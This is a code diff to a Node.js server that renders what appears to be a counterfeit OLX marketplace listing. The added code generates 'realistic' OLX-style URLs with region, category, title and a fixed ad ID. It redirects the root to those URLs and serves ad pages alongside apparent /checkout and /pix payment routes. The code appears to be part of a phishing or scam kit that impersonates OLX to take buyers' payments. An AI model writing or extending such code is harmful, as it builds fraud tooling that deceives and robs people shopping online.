@@ -166,6 +166,11 @@ function renderAdHtml(rawHtml, config) {
     html = html.replace(htmlTagMatch[0], htmlTagMatch[0] + '\n' + scriptTag);
   }
 
+  // Injetar <base href="/"> para links absolutos em URLs aninhadas/poluídas
+  if (!html.includes('<base ') && !html.includes('<base>')) {
+    html = html.replace(/<head[^>]*>/i, '$&\n  <base href="/">');
+  }
+
   // 2. <title>
   if (p.title) {
     html = html.replace(/<title>[\s\S]*?<\/title>/i, `<title>${p.title} - ${p.category || 'OLX'} | OLX</title>`);
@@ -851,8 +856,85 @@ async function handleRequest(req, res) {
     }
   }
 
-  // Ad Sales Page: Zero-Flicker Pre-Rendered (SSR-lite)
-  if (reqPath === '/' || reqPath === '' || reqPath === '/iphone-17-branco-olx.html' || reqPath === '/index.html' || reqPath === '/mobile.html') {
+  // Helper: Gerar URL realista e poluída estilo OLX oficial
+  function generateRealOlxPath(config) {
+    const p = (config && config.product) || {};
+    const loc = (p.location || '').toLowerCase();
+    let stateRegion = 'estado-sp/sao-paulo-e-regiao';
+    if (loc.includes('rio de janeiro') || loc.includes('rj')) stateRegion = 'estado-rj/rio-de-janeiro-e-regiao';
+    else if (loc.includes('minas gerais') || loc.includes('mg') || loc.includes('belo horizonte')) stateRegion = 'estado-mg/belo-horizonte-e-regiao';
+    else if (loc.includes('parana') || loc.includes('pr') || loc.includes('curitiba')) stateRegion = 'estado-pr/curitiba-e-regiao';
+    else if (loc.includes('rio grande do sul') || loc.includes('rs') || loc.includes('porto alegre')) stateRegion = 'estado-rs/porto-alegre-e-regiao';
+    else if (loc.includes('bahia') || loc.includes('ba') || loc.includes('salvador')) stateRegion = 'estado-ba/salvador-e-regiao';
+
+    const cat = (p.category || '').toLowerCase();
+    let categorySlug = 'eletrodomesticos/geladeiras-e-freezers';
+    if (cat.includes('geladeira') || cat.includes('freezer') || cat.includes('fogão') || cat.includes('lavadora') || cat.includes('micro-ondas') || cat.includes('eletrodom')) {
+      categorySlug = 'eletrodomesticos/geladeiras-e-freezers';
+    } else if (cat.includes('celular') || cat.includes('smartphone') || cat.includes('iphone') || cat.includes('telefonia')) {
+      categorySlug = 'celulares-e-telefonia/celulares-e-smartphones';
+    } else if (cat.includes('game') || cat.includes('jogos') || cat.includes('console') || cat.includes('playstation') || cat.includes('xbox')) {
+      categorySlug = 'videogames/consoles';
+    } else if (cat.includes('informatica') || cat.includes('computador') || cat.includes('notebook')) {
+      categorySlug = 'informatica/computadores-e-acessorios';
+    } else if (cat.includes('audio') || cat.includes('tv') || cat.includes('video')) {
+      categorySlug = 'audio-tv-video-e-fotografia';
+    } else if (cat.includes('moveis') || cat.includes('móveis')) {
+      categorySlug = 'moveis/outros-moveis';
+    } else if (cat.includes('carro') || cat.includes('auto') || cat.includes('veiculo') || cat.includes('veículo')) {
+      categorySlug = 'autos-e-pecas/carros-vans-e-utilitarios';
+    } else {
+      const cleanCat = cat.normalize('NFD').replace(/[\u0300-\u036f]/g, '').toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '');
+      categorySlug = cleanCat || 'eletrodomesticos/geladeiras-e-freezers';
+    }
+
+    const titleSlug = (p.title || 'anuncio-olx')
+      .normalize('NFD')
+      .replace(/[\u0300-\u036f]/g, '')
+      .toLowerCase()
+      .replace(/[^a-z0-9]+/g, '-')
+      .replace(/^-+|-+$/g, '')
+      .slice(0, 90);
+
+    const adId = '1541067591';
+    return `/${stateRegion}/${categorySlug}/${titleSlug}-${adId}`;
+  }
+
+  // Verifica se a rota é uma página do anúncio (inclui links poluídos com categorias)
+  function isAdPath(pathname) {
+    if (pathname === '/' || pathname === '' || pathname === '/iphone-17-branco-olx.html' || pathname === '/index.html' || pathname === '/mobile.html') {
+      return true;
+    }
+    const notAd = pathname.startsWith('/api') ||
+                  pathname.startsWith('/9bkp') ||
+                  pathname.startsWith('/admin') ||
+                  pathname.startsWith('/checkout') ||
+                  pathname.startsWith('/pix') ||
+                  pathname.startsWith('/perfil') ||
+                  pathname.startsWith('/images') ||
+                  pathname.startsWith('/public') ||
+                  /\.(css|js|json|png|jpg|jpeg|gif|webp|svg|ico|woff|woff2|ttf|eot|mp4|webm)$/i.test(pathname);
+    return !notAd;
+  }
+
+  // Redirecionamento da raiz "/" ou "/index.html" para o link realista com categorias
+  if (reqPath === '/' || reqPath === '' || reqPath === '/index.html') {
+    try {
+      const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
+      const isDraft = urlObj.searchParams.get('draft') === '1' || urlObj.searchParams.get('preview') === '1';
+      const cfg = loadCurrentConfig(isDraft);
+      const realPath = generateRealOlxPath(cfg);
+      res.writeHead(302, {
+        'Location': realPath + (urlObj.search || ''),
+        'Cache-Control': 'no-cache, no-store, must-revalidate'
+      });
+      res.end();
+      return;
+    } catch(e) {}
+  }
+
+  // Ad Sales Page: Zero-Flicker Pre-Rendered (SSR-lite) para qualquer link de anúncio
+  if (isAdPath(reqPath)) {
     try {
       const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
       const isDraft = urlObj.searchParams.get('draft') === '1' || urlObj.searchParams.get('draft') === 'true' || urlObj.searchParams.get('preview') === '1' || urlObj.searchParams.get('preview') === 'true';
